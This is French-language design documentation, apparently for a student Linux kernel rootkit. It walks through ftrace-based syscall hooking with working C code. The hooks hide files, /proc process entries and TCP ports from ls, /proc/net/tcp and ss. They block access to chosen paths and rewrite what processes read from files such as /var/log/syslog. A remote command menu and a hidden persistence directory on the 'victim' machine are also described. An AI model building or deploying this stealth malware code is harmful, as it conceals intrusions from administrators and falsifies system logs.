\page hooks Hooks
\tableofcontents

## 1. 🌐 Introduction

Ce document décrit de manière précise et détaillée le fonctionnement de l’architecture `interceptor` utilisée dans le rootkit pour intercepter, modifier et contrôler les appels système sous Linux. Le système `interceptor` repose sur l’infrastructure *ftrace*, où chaque *hook* est capable d’intervenir avant ou après l’exécution de la fonction native, de modifier ses arguments ou son résultat, et d’être activé ou désactivé dynamiquement en fonction de fichiers de configuration. L’organisation du code est structurée en deux modules principaux : le cœur (`core`), responsable de l’installation et de la gestion des hooks, et les modules spécifiques (`hooks`) qui implémentent des comportements tels que le masquage, l’interdiction ou la modification des fichiers et des ports réseau.

```bash
interceptor
├── core
│   ├── include
│   │   ├── ftrace.h
│   │   ├── init.h
│   │   └── menu.h
│   ├── array.c               # Gestion des tableaux dynamiques de hooks
│   ├── ftrace.c              # Implémentation du mécanisme ftrace
│   ├── init.c                # Module init/exit avec fichiers par défaut.
│   └── menu.c                # Menu pour ajouter/enlever des fichiers à traiter
└── hooks
    ├── alterate              # Module d’altération        
    │   ├── alterate_api.c
    │   ├── alterate_api.h
    │   ├── alterate.c
    │   └── alterate.h
    ├── forbid                # Module d’interdiction
    │   ├── forbid_api.c
    │   ├── forbid_api.h
    │   ├── forbid.c
    │   └── forbid.h
    └── hide                  # Module de camouflage
        ├── hide_api.c
        ├── hide_api.h
        ├── hide.c
        └── hide.h
```

## 2. 🏛️ Historicité

Intercepter un appel système dans le noyau Linux peut se faire par plusieurs approches, chacune avec ses compromis en termes de performance, stabilité et complexité. D'après nos recherches, l’une des méthodes les plus directes consiste à remplacer une entrée dans la table des appels système `sys_call_table` par un pointeur vers une fonction *wrapper*. Dans cette approche, dès que le noyau invoque un numéro de syscall correspondant à l’index visé, il est redirigé vers notre routine. Si elle est simple à implémenter et à comprendre, à partir des versions 5.x du noyau, la table n’est plus exportée et devient non-modifiable (écriture protégée), rendant cette technique assez instable... en tout cas, nous n'avons pas réussi à l'implémenter sur notre version de Linux (6.8.0-58-generic). Nous souhaitions avoir une version du kernel la plus récente possible, donc nous avons cherché une autre façon de faire. Face à cette contrainte, nous avons envisagé l’utilisation de *kprobes*, qui insèrent un *breakpoint* (`int3`) sur la fonction cible. Lorsqu’elle est appelée, une exception est levée, ce qui permet d’exécuter notre gestionnaire de kprobe. Cependant, cette technique engendre un coût non négligeable en raison des interruptions fréquentes. Nous craignions que la présence de nombreux *kprobes* simultanés ne provoque un afflux d’interruptions et donc une dégradation des performances.

C’est pour cette raison que nous nous sommes tournés vers `ftrace`, l’infrastructure d’instrumentation native du noyau (notamment utilisé pour mesurer les performances, faire des call graphs, etc). L’API expose des mécanismes comme `register_ftrace_function` ou la structure `ftrace_ops`, permettant de définir des callbacks qui reçoivent la structure `pt_regs *` en paramètre. À partir de là, il devient possible de lire ou modifier les registres, de décider d’appeler la fonction originale ou de renvoyer directement un code d’erreur, et même de modifier la valeur de retour.

## 3. ⚙️ Composants cœur

### 3.1 🔍 Mécanisme ftrace

Le mécanisme *ftrace* du module interceptor s’appuie principalement sur deux fichiers : core/include/ftrace.h, qui définit la structure et les prototypes, et core/ftrace.c, qui implémente les fonctions d’installation et de suppression des hooks. Nous décrivons ici en détail chaque étape, du repérage du symbole à l’interception effective, en illustrant par des extraits de code. 

#### 3.1.1 Fondations
```c
struct ftrace_hook{
    const char *name;       // Nom du symbole (syscall ou fonction) à intercepter
    void *function;         // Adresse de notre fonction de hook (wrapper)
    void *original;         // Adresse de la fonction native (backup)
    unsigned long address;  // Adresse effective du symbole dans le noyau
    struct ftrace_ops ops;  // Structure ftrace pour gérer l’interception
};
```

Au cœur de ce mécanisme se trouve la structure ftrace_hook, qui regroupe toutes les informations nécessaires pour qu’un hook fonctionne. 
- `name` contient le nom du symbole que l’on souhaite surveiller.
- `function` sert à pointer vers notre fonction *custom*. 
- `address` est utilisé pour conserver l'adresse grâce à la fonction *kallsyms_lookup_name*.
- `struct ftrace_ops` sert à communiquer avec l’API ftrace. 

Pour que notre *wrapper* puisse invoquer la fonction originale, on stocke aussi l’adresse de la fonction native dans `original`. Dans le code de fh_install_hook de ftrace.c, on observe :
```c
hook->address = kallsyms_lookup(hook->name);
...
*((unsigned long *)hook->original) = hook->address;
``` 
Ici, la première ligne résout l’adresse du symbole et la stocke dans `hook->address`. Cette valeur sert ensuite à instruire ftrace. Quant à `hook->original`, il pointe vers une variable de type `unsigned long` définie dans le module de hook lui-même (par exemple, `__orig_read` dans le cas d’un hook sur `read`) et permet au *wrapper*, plus tard, d’appeler la vraie fonction noyau. Ce n’est pas forcément essentiel, mais ça simplifie grandement le code. Par exemple, dans alterate.c, on aura :
```c
asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;
asmlinkage long notrace read_hook(const struct pt_regs *regs) {
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;
    ...
}
```

#### 3.1.2 Macros

Pour faciliter la déclaration d’un hook sur un syscall, nous avons introduit trois macros. SYSCALL_NAME(name) préfixe automatiquement la chaîne par *__x64_*, de sorte que l’on n’ait pas à écrire manuellement le nom exact du symbole. La macro HOOK_SYS(_name, _hook, _orig) simplifie ensuite l’initialisation d’un élément ftrace_hook en lui fournissant en une seule ligne le nom du syscall, l’adresse de notre fonction de hook et la variable où sera stocké le pointeur original. Pour des fonctions du noyau qui ne sont pas des syscalls, on peut utiliser la macro plus générique HOOK(_name, _hook, _orig).
```c
#define SYSCALL_NAME(name) ("__x64_" name)
#define HOOK_SYS(_name, _hook, _orig) {					\
    .name = SYSCALL_NAME(_name),                        \
    .function = (_hook),                                \
    .original = (_orig),                               	\
}

#define HOOK(_name, _hook, _orig) {					    \
    .name = (_name),                                    \
    .function = (_hook),                                \
    .original = (_orig),                               	\
}
```

Le reste de ftrace.h se compose surtout de prototypes. 
- `fh_init_kallsyms_lookup` sert à récupérer un pointeur vers la fonction interne `kallsyms_lookup_name()`, en installant temporairement un kprobe.
- `fh_install_hook` et `fh_remove_hook` gèrent respectivement l’installation et la suppression d’un hook.
- `fh_install_hooks` et `fh_remove_hooks` permettent de gérer en bloc un tableau de hooks.

La liste de l’ensemble des hooks implémentés peut être retrouvée dans array.c :
```c
struct ftrace_hook hooks[] = {
    HOOK_SYS("sys_getdents64", getdents64_hook, &__orig_getdents64),
    HOOK_SYS("sys_read", read_hook, &__orig_read),
    HOOK_SYS("sys_openat", openat_hook, &__orig_openat),
    HOOK_SYS("sys_newfstatat", stat_hook, &__orig_newfstatat),
    HOOK_SYS("sys_fstat", stat_hook, &__orig_fstat),
    HOOK_SYS("sys_lstat", stat_hook, &__orig_lstat),
    HOOK_SYS("sys_stat", stat_hook, &__orig_stat),
    HOOK_SYS("sys_recvmsg", recvmsg_hook, &__orig_recvmsg),
    HOOK_SYS("sys_chdir", chdir_hook, &__orig_chdir),

    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &__orig_tcp6_seq_show)
};
```

#### 3.1.3 kallsyms

Afin de résoudre l’adresse de `kallsyms_lookup_name` et de pouvoir localiser dynamiquement les symboles non exportés, nous avons créé un kprobe temporaire, pour ensuite lire l’adresse retournée dans `kp.addr` dès que `register_kprobe` réussit. Cette opération est exécutée une seule fois : on stocke l’adresse dans une variable statique pour éviter d’interroger le noyau à chaque hook.
```c
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
static kallsyms_lookup_name_t fh_kallsyms_lookup_ptr = NULL;
int ret;
struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

if (fh_kallsyms_lookup_ptr)
    return fh_kallsyms_lookup_ptr;

ret = register_kprobe(&kp);
if (ret < 0) {
    ERR_MSG("fh_init_kallsyms_lookup: register_kprobe failed\n");
    return NULL;
}

fh_kallsyms_lookup_ptr = (kallsyms_lookup_name_t)kp.addr;
unregister_kprobe(&kp);
```

#### 3.1.5 fh_install_hook

Une fois la fonction `kallsyms_lookup_name` disponible, la suite du processus repose sur la fonction `fh_install_hook(struct ftrace_hook *hook)`. Elle prend en argument un pointeur vers une structure ftrace_hook. On appelle d’abord `kallsyms_lookup(hook->name)` pour récupérer l’adresse effective de la fonction cible dans le noyau. Si cette adresse est valide, on la copie immédiatement dans la variable hook->original, afin qu’elle pointe désormais vers la fonction native. Donc, à chaque fois que dans notre fonction *custom* nous souhaitons invoquer l’implémentation de base, nous lirons l’adresse stockée dans `*hook->original`.
```c
int err;
unsigned long (*kallsyms_lookup)(const char *) = fh_init_kallsyms_lookup();
if (!kallsyms_lookup) {
    ERR_MSG("ftrace: unable to get kallsyms_lookup_name pointer\n");
    return -ENOENT;
}

hook->address = kallsyms_lookup(hook->name);
if (!hook->address) {
    ERR_MSG("ftrace: unresolved symbol\n");
    return -ENOENT;
}

*((unsigned long *)hook->original) = hook->address;

hook->ops.func = fh_ftrace_thunk;
hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS 
                | FTRACE_OPS_FL_RECURSION 
                | FTRACE_OPS_FL_IPMODIFY;

err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
if (err) {
    ERR_MSG("ftrace: ftrace_set_filter_ip() failed.\n");
    return err;
}

err = register_ftrace_function(&hook->ops);
if (err) {
    ERR_MSG("ftrace: register_ftrace_function() failed.\n");
    return err;
}
return 0;
```
Ensuite, on configure `hook->ops`. On définit son champ `func` pour qu’il pointe vers notre callback `fh_ftrace_thunk`. Cette dernière est appelée par ftrace juste avant que la fonction native soit exécutée. Dans `ops.flags`, on combine trois options ci-dessous. Pour plus de détails, voir [The Linux Kernel](https://www.kernel.org/doc/html/v5.3/trace/ftrace-uses.html):
- `FTRACE_OPS_FL_SAVE_REGS` pour sauvegarder automatiquement le contexte des registres,
- `FTRACE_OPS_FL_RECURSION` prévient la récursion si le callback appelle une fonction déjà surveillée (ouch),
- `FTRACE_OPS_FL_IPMODIFY` autorise la modification du registre d’instruction (RIP), donc en gros la base du fonctionnement de ftrace pour notre cas.

Une fois ces champs positionnés, on doit informer ftrace quelles adresses doivent etre surveillées. C’est le rôle de `ftrace_set_filter_ip`, à laquelle on passe l’adresse calculée `hook->address` et un indicateur à 0 pour signifier un ajout. Enfin, on appelle `register_ftrace_function(&hook->ops)` pour que le noyau appelle systématiquement `fh_ftrace_thunk` lorsqu’une invocation à cette adresse se produit.

#### 3.1.4 fh_ftrace_thunk

Dès qu’elle est invoquée, cette fonction récupère la structure ftrace_hook grâce à `container_of` (fonction magique), puis vérifie que le `parent_ip` ne provient pas du module lui-même. Enfin, on modifie le registre `regs->ip` pour qu’il pointe vers notre *wrapper*. Ainsi, lorsque ftrace rend la main, le flux d’exécution sautera directement vers la fonction de hook au lieu d’appeler la fonction native ahah !
```c
struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
  if (!within_module(parent_ip, THIS_MODULE))
    ((struct pt_regs *)regs)->ip = (unsigned long)hook->function;
```

#### 3.1.6 Autre

Les autres fonctions de ftrace.c permettent de gérer la liste des hooks à installer, ainsi que le désenregistrement des hooks ftrace (fh_remove_hook, fh_install_hooks et fh_remove_hooks).

### 3.2 ⚙️ API

Comme mentionné dans la section [Utilisation](dc/da7/md_pages_204__usage.html), les hooks disposent d’un sous-menu spécifique défini dans menu.c, permettant d’interagir facilement à distance avec les différentes fonctions. Ce menu repose sur la même structure et les mêmes principes que celui de cmd.c. Pour chaque catégorie, trois commandes sont disponibles : une pour ajouter un hook, une pour le supprimer, et une pour lister les éléments actuellement affectés par un hook ftrace. Ci-dessous figure un aperçu de ce menu et des différentes fonctions associées. Lors de l’utilisation, il suffit d’exécuter la commande help pour afficher l’ensemble des commandes disponibles. Chaque liste de fichiers affectés par les hooks est dynamique et enregistrée dans des fichiers de configuration sur la machine victime. Ainsi, à chaque redémarrage, la configuration est automatiquement restaurée.
```c
static struct command hooks_commands[] = {
    { "hide", 4, "hide a file or directory (getdents64 hook)", 43, hide_dir_handler },
    { "unhide", 6, "unhide a file or directory", 32, unhide_dir_handler },
    { "list_hide", 9, "list hidden files/directories", 34, list_hidden_handler },
    { "add_port", 8, "add port to hide", 16, hide_port_handler },
    { "remove_port", 11, "remove hidden port", 18, unhide_port_handler },
    { "list_port", 9, "list hidden ports", 17, list_hidden_port_handler },
    { "forbid", 6, "forbid open/stat on a file (openat/stat/lstat... hook)", 55, forbid_file_handler },
    { "unforbid", 8, "remove forbid on a file", 30, unforbid_file_handler },
    { "list_forbid", 11, "list forbidden files", 30, list_forbidden_handler },
    { "modify", 6, "[CAREFUL] modify a file with hide/replace operation (read hook)", 64, modify_file_handler },
    { "unmodify", 8, "unmodify a file", 30, unmodify_file_handler },
    { "list_modify", 11, "list alterate rules", 30, list_alterate_handler },
    { "help", 4, "display hooks help menu", 25, hooks_help },
    { NULL, 0, NULL, 0, NULL }
};
```

### 3.3 🚀 Initialisation

Le fichier init.c est appelé dès l’insertion du rootkit et permet de gérer les fichiers pris en charge par défaut. Il installe les hooks via ftrace, initialise les différentes configurations en récupérant les fichiers associés, puis les charge en mémoire. Ces fichiers de configuration se trouvent dans un répertoire spécifique, /var/lib/systemd/.epirootkit-hidden-fs (dont l’accès est restreint). Les noms des fichiers sont paramétrables dans include/config.h et incluent notamment :
- `hide_list.cfg`
- `forbid_list.cfg`
- `alterate_list.cfg`
- `passwd.cfg`
- `hide_ports.cfg`
- `std.out`
- `std.err`

> Par ailleurs, ce fichier gère également le déchargement du rootkit, en s’occupant de la désinstallation des hooks et de la mise à jour des fichiers de configuration.

## 4. 🪝 Hooks

### 4.1 👻 hide

La partie *hide* du rootkit est chargée de masquer deux catégories principales d’éléments au sein du système : les fichiers et répertoires (interception de `getdents64`), ainsi que les ports TCP (interception de `tcp4_seq_show`, `tcp6_seq_show`, et `recvmsg`)

#### 4.1.1 Structures

Le mécanisme de masquage s’appuie sur deux instances de la structure `ulist` (définie dans utils/ulist.c). Ces listes sont déclarées et initialisées dans hide_api.c, à partir de deux fichiers de configuration dont les chemins sont définis au moment de la compilation. Ensuite, différentes fonctions permettent d’interagir avec ces listes, qui peuvent ainsi stocker les fichiers et ports à altérer via l’interception des appels système.
- `struct ulist hide_list` : liste des chemins (fichiers/répertoires) à cacher.
- `struct ulist hide_port_list` : liste des ports TCP à cacher.

```c
int hide_init(void);
void hide_exit(void);
int hide_file(const char *path);
int unhide_file(const char *path);
int hide_contains_str(const char *u_path);
int hide_list_get(char *buf, size_t buf_size);

int hide_port_init(void);
void hide_port_exit(void);
int hide_port(const char *port);
int unhide_port(const char *port);
int port_contains(const char *port);
int port_list_get(char *buf, size_t buf_size);
```

#### 4.1.2 Interception
```c
asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;
```
Le fichier `hide.c` contient l’ensemble des hooks gérés, et donc la déclaration des pointeurs vers les fonctions noyau d’origine. Pour ce qui est de l’appel système `getdents64`, il est utilisé par la plupart des appels de type `readdir()` ou `ls` et permet de lister dans un buffer l’ensemble des entrées d’un répertoire. L’interception de cet appel et sa redirection vers la fonction `getdents64_hook` nous permettent ainsi de masquer spécifiquement certains fichiers et répertoires. Ce hook est notamment utilisé pour dissimuler des dossiers de processus dans `/proc/`, comme ceux liés aux threads de communication réseau pour les protocoles DNS et TCP. Il est aussi utile pour cacher les fichiers liés à la persistance du rootkit ainsi que ceux relatifs aux éléments de configuration dans `/var/lib/systemd/.epirootkit-hidden-fs`.
```bash
victim@victim$ strace ls
execve("/sbin/ls", ["ls"], 0x7ffe4be49b00 /* 106 vars */) = 0
...
fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
getdents64(3, 0x5bb6802fc6f0 /* 13 entries */, 32768) = 376
getdents64(3, 0x5bb6802fc6f0 /* 0 entries */, 32768) = 0
close(3) = 0
...
```
Par ailleurs, les fonctions `tcp4_seq_show_hook` et `tcp6_seq_show_hook` interceptent respectivement l’affichage des entrées dans `/proc/net/tcp` et `/proc/net/tcp6`. En les détournant, il devient possible de masquer certaines connexions réseau et sockets ouverts, en fonction de ports source/destination spécifiés. Ces deux fonction sont d'ailleurs exportées dans la table de symboles du noyau (`/proc/kallsyms`), ce qui signifie qu’il est bien possible, au chargement du module, de récupérer leur adresse exacte en mémoire au moyen d’un appel à `kallsyms_lookup_name()`.
```bash
victim@victim$ cat /proc/kallsyms | grep tcp[46]_seq_show
0000000000000000 t __pfx_tcp4_seq_show
0000000000000000 t tcp4_seq_show
0000000000000000 t __pfx_tcp6_seq_show
0000000000000000 t tcp6_seq_show
```
Enfin, l’interception de la fonction `recvmsg` permet de filtrer les dumps Netlink utilisés par des outils comme `ss`, `netstat`, etc.
Ces programmes n’accèdent pas directement aux fichiers mentionnés précédemment, mais communiquent via une socket Netlink de type `NETLINK_SOCK_DIAG`. Ainsi, pour masquer également ces connexions, la fonction `recvmsg_hook` intercepte l’appel système `recvmsg`, vérifie si la socket utilisée est bien de type `netlink-diag`, puis teste si les ports source ou destination figurent dans notre liste de ports à cacher `hide_port_list`. Le port **4242** est caché par défaut.

### 4.2 🚫 forbid

La partie *forbid* du rootkit a pour objectif d’interdire l’accès à certains fichiers ou répertoires. Concrètement, elle intercepte les appels systèmes de type `openat`, `stat` (et variantes), et `chdir` pour renvoyer une erreur dès qu’un chemin à *interdire* est détecté. Les fichiers par défaut incluent notamment les fichiers de configuration ainsi que les répertoires liés à la persistance.

#### 4.2.1 Structures

Le mécanisme de filtrage repose sur une unique instance de la structure ulist, définie dans utils/ulist.c, exactement comme précédemment... Cette liste conserve, sous forme de chaînes de chemins absolus, tous les fichiers ou répertoires auxquels on souhaite interdire l’accès. Les fonctions exposées dans forbid_api.h permettent de gérer dynamiquement cette liste :
```c
int forbid_init(void);
void forbid_exit(void);
int forbid_file(const char *path);
int unforbid_file(const char *path);
int forbid_contains(const char __user *u_path);
int forbid_list_get(char *buf, size_t buf_size);
```

#### 4.2.2 Interception
```c
asmlinkage long (*__orig_openat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_newfstatat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_fstat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_lstat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_stat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_chdir)(const struct pt_regs *regs) = NULL;
asmlinkage long (*__orig_ptrace)(const struct pt_regs *regs) = NULL;
```

Toutes les interceptions sont déclarées et implémentées dans forbid.c. On y trouve, dans un premier temps, les pointeurs vers les fonctions noyau d’origine, qui seront sauvegardés au moment de l’installation des hooks. Pour ce qui est de la fonction `openat` (appelée via `sys_openat`), elle est utilisée pour ouvrir un fichier ou créer un lien. Dans notre hook, on récupère l’argument `pathname` passé par l’espace utilisateur depuis le registre `regs->si`.
```c
asmlinkage long notrace openat_hook(const struct pt_regs *regs) {
    const char __user *u_path = (const char __user *)regs->si;
    if (forbid_contains(u_path))
        return -ENOENT;
    return __orig_openat(regs);
}
```
```bash
root@victim# cat /etc/secret.conf
cat: /etc/secret.conf: No such file or directory
```
Ainsi, si le chemin est interdit, le hook renvoie `-ENOENT`, ce qui fait croire au processus qu’il n’existe pas ! Dans le cas contraire, on invoque ici `__orig_openat(regs)` pour ouvrir le fichier normalement. Par ailleurs, de nombreux utilitaires reposent sur la famille d’appels systèmes `stat`, `lstat`, `fstat` et `newfstatat` pour obtenir les métadonnées d’un fichier (permissions, taille, propriétaire, etc.). Plutôt que d’installer quatre hooks séparés, nous avons regroupé l’interception de ces quatre appels dans une unique fonction `stat_hook`, qui examine `orig_ax` pour rediriger vers la fonction d’origine appropriée dans la fonction stat_hook(const struct pt_regs *regs). Enfin, l’appel système `chdir` permet à un processus de changer son répertoire de travail courant. Si l’on veut empêcher un utilisateur ou un script de s’avancer dans un dossier jugé sensible, on intercepte aussi `chdir` et on bloque le changement de dossier dès que le chemin se trouve dans la liste `forbid_list`.
```c
asmlinkage long notrace chdir_hook(const struct pt_regs *regs) {
    const char __user *u_path = (const char __user *)regs->di;
    if (forbid_contains(u_path))
        return -ENOENT;
    return __orig_chdir(regs);
}
```

### 4.3 🧬 alterate

La partie *alterate* du rootkit permet de modifier à la volée le contenu des fichiers lus par un processus, en se basant sur des règles définies pour chaque chemin. Dès qu’un appel à `read` est intercepté sur un *file descriptor* dont le chemin figure dans la liste des fichiers à altérer, on peut soit masquer une ligne précise, soit masquer toute ligne contenant un certain mot clef, ou soit remplacer une sous-chaîne par une autre dans chaque ligne retournée. Cette fonctionnalité est dynamique, mais doit être utilisée avec précaution, car il n’est pas toujours garanti que les éléments basés sur les numéros de ligne fonctionnent de manière fiable (hehe).

#### 4.3.1 Structures

Le cœur du mécanisme d’alteration repose sur la structure `alt_list`, définie et gérée dans alterate_api.c. Cette liste stocke les chemins des fichiers à surveiller, associée à un payload textuel codant la règle d’altération. Chaque élément de `alt_list` correspond à un enregistrement de configuration dont la clé `value` est le chemin absolu du fichier, et dont le payload est une chaîne au format suivant :
```bash
<value> | <flags> | <numero_de_ligne>:<mot_clef_a_masquer_lol>:<src_substr>:<dst_substr>
```
En effet, un élément de liste dans ulist.c a la structure suivante :
```bash
struct ulist_item {
    char *value;
    u32 flags;
    char *payload;
    struct list_head list;
};
```
Ainsi par exemple, si la ligne de configuration contient `/var/log/syslog|0|10:claire:efrei:epita`, on aura dans le fichier `/var/log/syslog` (avec un certes un flag de 0, mais que finalement nous n'utilisons jamais...) :
- La dixième ligne sera cachée.
- Toutes les lignes contenant le mot *claire* disparaîtront.
- Toutes les occurrences de *efrei* seront remplacées par *epita*.

Le fichier alterate_api.h expose par ailleurs l’API de gestion de cette configuration :
```c
int alterate_init(void);
void alterate_exit(void);
int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst);
int alterate_remove(const char *path);
int alterate_contains(const char __user *u_path);
int alterate_list_get(char *buf, size_t buf_size);
```
#### 4.3.2 Interception

Le fichier alterate.c implémente l’intégralité de la logique d’interception de `read` par la fonction read_hook(const struct pt_regs *regs). La fonction de hook n’est ni très élégante ni optimisée, car le parsing répétitif de la liste introduit peut-être une complexité inutile.
```c
    char *dup = kstrdup(rule_payload, GFP_KERNEL);
    if (!dup)
        return ret;
    char *fld[4] = { NULL, NULL, NULL, NULL };
    int i;
    for (i = 0; i < 3; i++)
        fld[i] = strsep(&dup, ":");
    fld[3] = dup;

    int hide_line = simple_strtol(fld[0], NULL, 10);
    char *hide_substr = fld[1][0] ? fld[1] : NULL;
    char *src = fld[2][0] ? fld[2] : NULL;
    char *dst = fld[3][0] ? fld[3] : NULL;
```

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>